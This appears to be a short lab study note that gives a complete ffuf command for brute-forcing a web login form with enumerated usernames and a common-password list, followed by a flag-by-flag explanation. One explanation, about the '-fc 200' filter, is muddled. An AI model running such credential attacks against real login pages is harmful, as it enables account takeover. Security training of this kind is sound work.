Once the valid usernames are identified in the [[Username Enumeration]], we can now attempt to brute force on the login page.

`Make sure the terminal is run in the same directory as the valid usernames.txt file is.`
```
ffuf -w usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE-IP/customers/login -fc 200
```
- `-w:` specifies wordlists
- `usernames.txt:` is assigned to `W1`
- top 100 passwords are assigned to `W2`
- `-X POST:` specifies the POST HTTP method to use
- `-d "username=W1&password=W2":` sends the data in POST requests
- `-H 'Content-Type: application/x-www-form-urlencoded':` adds a header to indicate the POST request is sending form data so it properly understands our request.
- `-u:` target URL for the brute-force
- `-fc 200:` filters out responses with a 200 (OK) status code, meaning successful logins are ignored.